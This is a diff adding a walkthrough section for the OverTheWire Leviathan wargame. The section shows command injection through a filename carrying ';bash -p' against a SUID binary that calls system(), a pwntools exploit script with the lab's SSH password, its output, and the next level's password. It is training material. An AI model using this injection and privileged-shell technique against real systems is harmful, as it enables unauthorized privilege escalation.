@@ -228,9 +228,61 @@ setreuid(12002, 12002)                                                          
 system("/bin/cat .profile"# ~/.profile: executed by the command interpreter for login shells.
 ```
 
-It uses `system()` function with cat command -> `cat + our input`, we have to trick the binary.
+It uses `system()` function with cat command -> `cat + our input`, we have to trick the binary. File is SUID that means we can run the binary as user `leviathan3`, let's make a random name file & add `;bash -p`. `-p` allows the shell to run with SUID privileges.
 
+```
+leviathan2@leviathan:~$ touch /tmp/"l0ksjajs;bash -p"
+leviathan2@leviathan:~$ ./printfile /tmp/"l0ksjajs;bash -p"
+/bin/cat: /tmp/l0ksjajs: No such file or directory
+leviathan3@leviathan:~$ whoami
+leviathan3
+```
 
+The password for next level:
+
+```
+leviathan3@leviathan:~$ cat /etc/leviathan_pass/leviathan3 
+Ahdiemoo1j
+```
+
+My pwntools exploit (you may need to run the exploit multiple times!):
+
+```python
+#!/usr/bin/env python3
+#context.log_level = 'debug'
+
+from pwn import *
+
+log.info('leviathan series pwntools exploit by atom')
+log.info('shell crashes, you may need to run the exploit multiple times!')
+shell = ssh('leviathan2', 'leviathan.labs.overthewire.org', password='ougahZi8Ta', port=2223)
+sh = shell.run('sh')
+sh.sendline('touch /tmp/\'ajsdaskaaa;bash -p\'')
+sh.sendline('./printfile /tmp/\'ajsdaskaaa;bash -p\'')
+log.warn('run -> cat /etc/leviathan_pass/leviathan3 to grab the flag!')
+sh.interactive()
+```
+
+```
+$ ./exp.py
+[*] leviathan series pwntools exploit by atom
+[*] shell crashes, you may need to run the exploit multiple times!
+[+] Connecting to leviathan.labs.overthewire.org on port 2223: Done
+[*] leviathan2@leviathan.labs.overthewire.org:
+    Distro    Devuan 2.0
+    OS:       linux
+    Arch:     amd64
+    Version:  4.18.12
+    ASLR:     Disabled
+[+] Opening new channel: 'sh': Done
+[!] run -> cat /etc/leviathan_pass/leviathan3 to grab the flag!
+[*] Switching to interactive mode
+$ $ /bin/cat: /tmp/ajsdaskaaa: No such file or directory
+$ cat /etc/leviathan_pass/leviathan3
+Ahdiemoo1j
+```
+
+## Level 3
 
 
 
